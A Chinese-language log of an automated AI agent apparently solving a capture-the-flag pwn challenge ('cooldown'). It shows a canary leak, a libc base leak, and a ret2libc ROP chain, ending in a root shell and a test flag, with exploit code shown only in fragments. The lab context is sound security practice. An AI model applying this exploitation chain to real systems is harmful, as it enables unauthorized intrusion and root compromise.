19:29:12 [exploit] `/bin/sh` 位于偏移量 `0x1cb42f`。现在我已经具备了构建 exploit 所需的一切。  让我思考一下完整的攻击链：  1. **迭代 1**：发送 105 字节（无换行符）→ 泄露 canary 字节 1-7。Canary = `\x00` + leaked[0:7]。回答 'N
19:29:12 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "commands": "b *main+0xd6; run; print/x $rsp; print/x $rbp; continue", "std)
19:29:22 [exploit]   ← gdb_run(10.6s): gdb timed out (10s)。多半是程序 run 后阻塞——检查 stdin 是否提供了驱动程序到断点的输入序列；命令序列若含等待输入的交互命令也会卡。修改 commands/stdin 后重试，相同参数重调结果不变。
19:29:22 [exploit] → 调用 GLM...
19:29:50 [exploit] ← GLM(28.1s): 调工具[write_file]
19:29:50 [exploit] `leave` 断点 (main+0xd6) 没有被触发，因为 stdin "A\nY" 可能没有正确驱动循环。让我换个方法试试 —— 我直接编写带有对齐处理的 exploit，然后进行测试。  实际上，让我更仔细地重新思考一下对齐问题。关键问题是：在 `main` 执行 `ret` 之后，RSP 
19:29:50 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n# Exploit for cooldown (echo service) - Stack Buffer Overflow + Info Leak\n# Bugs: BUG-001 (stack overflow), BUG-)
19:29:50 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/exploit.py
19:29:50 [exploit] → 调用 GLM...
19:29:52 [exploit] ← GLM(2.0s): 调工具[run_script]
19:29:52 [exploit]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/exploit.py", "timeout": 30})
19:29:57 [exploit]   ← run_script(4.4s): rc=0 ⏎ --- stdout (summarized) --- ⏎ --- key evidence --- ⏎ [*] Output: b'SHELL_OK\nuid=0(root) gid=0(root) groups=0(root)\ntest_flag_content_here\nDO...(1067 chars)
19:29:57 [exploit] → 调用 GLM...
19:30:03 [exploit] ← GLM(5.8s): 调工具[execute]
19:30:03 [exploit] 漏洞利用在第一次尝试时就成功了！关键证据：  - **Canary 已泄露**：`0xfefb06de09561700` (LSB = 0x00 ✓) - **Libc 基址已泄露**：`0x76ad9871c000` (页对齐 ✓) - **已获取 Shell**：`uid=0(root) gid
19:30:03 [exploit]   → 工具 execute({"command": "rm -f /work/workspace/0009-2021-29-cooldown-20260905-190810/test_leak.py /work/workspace/0009-2021-29-cooldown-20260905-190810/test_*.py )
19:30:03 [exploit]   ← execute(0.0s): <no output> ⏎ [Command succeeded with exit code 0]
19:30:03 [exploit] → 调用 GLM...
19:30:06 [exploit] ← GLM(3.7s): 调工具[read_file]
19:30:06 [exploit] 现在让我读取最终的 exploit.py 以包含在报告中：
19:30:06 [exploit]   → 工具 read_file({"file_path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/exploit.py"})
19:30:06 [exploit]   ← read_file(0.0s):   1  #!/usr/bin/env python3 ⏎   2  # Exploit for cooldown (echo service) - Stack Buffer Overflow + Info Leak ⏎   3  # Bugs: BUG-001 (stack overflow), ...(4332 chars)
19:30:06 [exploit] → 调用 GLM...
19:30:08 [exploit] ← GLM(1.7s): 调工具[read_file]
19:30:08 [exploit]   → 工具 read_file({"file_path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/exploit.py", "offset": 100})
19:30:08 [exploit]   ← read_file(0.0s): 101      pop_rdi_ret = libc_base + LIBC_POP_RDI_RET ⏎ 102      bin_sh_addr = libc_base + LIBC_BIN_SH ⏎ 103      ret_gadget = libc_base + LIBC_RET ⏎ 10...(2834 chars)
19:30:08 [exploit] → 调用 GLM...
19:30:48 [exploit] ← GLM(40.0s): 调工具[submit_final_result]
19:30:48 [exploit] 漏洞利用已完成并经过验证。现在让我提交最终结果：
19:30:48 [exploit] ✓ submit_final_result 收到最终报告（ExploitReport 校验通过，11935 chars）
19:30:48 [exploit] → 调用 GLM...
19:30:55 [exploit] ← GLM(7.3s)
19:30:55 [exploit] 漏洞利用已成功提交。以下是所完成工作的总结：  ## S4 Exploit 总结  **目标**：cooldown echo service (x86_64, PIE, NX, Canary, Partial RELRO, glibc 2.39)  **选定路线**：ret2libc ROP 链 (
19:30:55 ✅ Exploit 成功（status=COMPLETED, result_status=EXPLOIT_SUCCESS）。
19:30:55 [stage4] 保存 → /work/workspace/0009-2021-29-cooldown-20260905-190810/stage4.json
19:31:14 📄 渗透报告：/work/workspace/0009-2021-29-cooldown-20260905-190810/report.md
Partial RELRO, glibc 2.39)  **选定路线**：ret2libc ROP 链 (
19:30:55 ✅ Exploit 成功（status=COMPLETED, result_status=EXPLOIT_SUCCESS）。
=== 主 agent 汇总 ===
分析完成！以下是结果摘要：

## 漏洞分析结果

| 项目 | 结果 |
|------|------|
| **二进制** | `/work/ctf/0009-2021-29-cooldown/target` |
| **Exploit 成功** | ✅ 是 |
| **Exploit 脚本** | `/work/workspace/0009-2021-29-cooldown-20260905-190810/exploit.py` |
| **完整报告** | `/work/workspace/0009-2021-29-cooldown-20260905-190810/report.md` |
| **工作目录** | `/work/workspace/0009-2021-29-cooldown-20260905-190810/` |

完整 S1-S4 流程（侦察 → 语义 → 原语验证 → exploit）已跑通，exploit 成功利用了目标二进制中的漏洞。所有产物（stage1-4.json、exploit.py、report.md、full_run.log）均保存在上述 workspace 目录中，可进一步查看详细报告了解漏洞类型和利用链路。
